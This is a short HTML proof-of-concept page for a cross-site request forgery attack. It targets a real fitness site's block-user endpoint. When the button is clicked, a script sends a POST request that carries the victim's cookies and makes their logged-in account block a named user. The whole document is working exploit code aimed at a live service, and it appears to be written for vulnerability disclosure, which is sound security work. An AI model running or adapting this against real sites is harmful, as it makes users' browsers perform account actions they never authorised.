<!doctype html>
<html>
  <body>
    <h2>CSRF PoC â€” Block User</h2>
    <button onclick="sendCSRF()">Click to send request</button>

    <script>
      function sendCSRF() {
        fetch("https://www.myfitnesspal.com/api/services/blocked_users/block", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({"username":"MyFitnessPal"}),
          credentials: "include" // include cookies
        })
        .then(r => r.text())
        .then(t => console.log("Response:", t))
        .catch(e => console.error(e));
      }
    </script>
  </body>
</html>
